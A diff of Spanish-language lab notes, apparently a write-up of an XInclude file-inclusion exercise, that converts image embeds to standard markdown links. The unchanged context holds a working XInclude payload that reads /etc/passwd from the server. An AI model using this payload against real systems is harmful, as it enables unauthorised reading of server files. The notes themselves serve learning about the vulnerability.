@@ -6,11 +6,11 @@ El resultado es que el servidor incluye el contenido del archivo directamente de
 
 Solucion
 Que es?
-![[Pasted image 20250730203814.png]]
+![Pasted image 20250730203814.png](imagenes/Pasted image 20250730203814.png)
 primero no vemos una estructura xml
-![[Pasted image 20250730204201.png]]
+![Pasted image 20250730204201.png](imagenes/Pasted image 20250730204201.png)
 
 Payload (<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>)
 
 el payload se pone aqui
-![[Pasted image 20250730204644.png]]
+![Pasted image 20250730204644.png](imagenes/Pasted image 20250730204644.png)
